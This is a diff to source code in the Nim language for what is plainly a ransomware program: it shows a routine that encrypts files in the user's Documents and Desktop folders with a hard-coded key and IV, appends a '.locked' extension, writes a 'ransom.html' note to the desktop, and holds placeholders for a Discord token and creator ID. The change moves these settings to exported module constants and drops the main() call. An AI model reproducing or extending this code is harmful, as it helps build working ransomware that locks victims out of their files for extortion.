@@ -50,6 +50,14 @@ const defaultHtml = """
 </body>
 </html>
 """
+
+const key* = "0123456789abcdef0123456789abcdef"
+const iv* = "abcdef9876543210"
+const extension* = ".locked"
+var htmlContent* = ""
+const discordToken* = ""
+const creatorId* = ""
+
 proc processFile(file: string, key: string, iv: string, extension: string) =
   try:
     if fileExists(file) and not file.endsWith(extension) and not file.contains("ransom.html"):
@@ -104,10 +112,6 @@ proc openInDefaultBrowser(filePath: string) =
   except OSError as e:
     echo "Error opening browser: ", e.msg
 
-const
-  discordToken = ""
-  creatorId = ""
-
 proc getHostname(): string =
   when defined(windows):
     let (output, exitCode) = execCmdEx("hostname")
@@ -142,11 +146,6 @@ proc main() =
     const decryptMode = true
   else:
     const decryptMode = false
-  
-  const key = "0123456789abcdef0123456789abcdef"
-  const iv = "abcdef9876543210"
-  const extension = ".locked"
-  var htmlContent = defaultHtml
 
   let targetDir = getHomeDir() / "Documents"
   let desktop = getHomeDir() / "Desktop"
@@ -182,6 +181,9 @@ proc main() =
     for file in files:
       processFile(file, key, iv, correctedExtension)
 
+    if htmlContent.len == 0:
+      htmlContent = defaultHtml
+
     let ransomFile = joinPath(desktop, "ransom.html")
     try:
       writeFile(ransomFile, htmlContent)
@@ -193,6 +195,3 @@ proc main() =
 
 when not isMainModule:
   discard
-
-when isMainModule:
-  main()
